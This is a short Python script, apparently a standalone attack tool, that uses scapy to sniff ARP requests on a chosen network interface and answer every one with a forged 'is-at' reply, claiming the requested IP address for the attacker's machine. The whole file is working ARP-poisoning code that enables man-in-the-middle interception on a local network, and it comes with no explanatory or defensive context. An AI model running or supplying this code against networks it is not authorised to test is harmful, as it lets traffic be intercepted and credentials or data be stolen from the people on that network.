#!/usr/bin/env python3

import sys
from scapy.all import sniff, sendp, ARP, Ether


if len(sys.argv) < 2:
    print(f'{sys.argv[0]} <iface>')
    sys.exit(1)


def arp_poison_callback(packet):
    if 1 == packet[ARP].op:
        answer = Ether(dst=packet[ARP].hwsrc) / ARP()
        answer[ARP].op = 'is-at'
        answer[ARP].hwdst = packet[ARP].hwsrc
        answer[ARP].psrc = packet[ARP].pdst
        answer[ARP].pdst = packet[ARP].psrc

        print(f'Spoofing {packet[ARP].psrc}: {packet[ARP].pdst} is me')

        sendp(answer, iface=sys.argv[1])


sniff(prn=arp_poison_callback, filter='arp', iface=sys.argv[1], store=0)
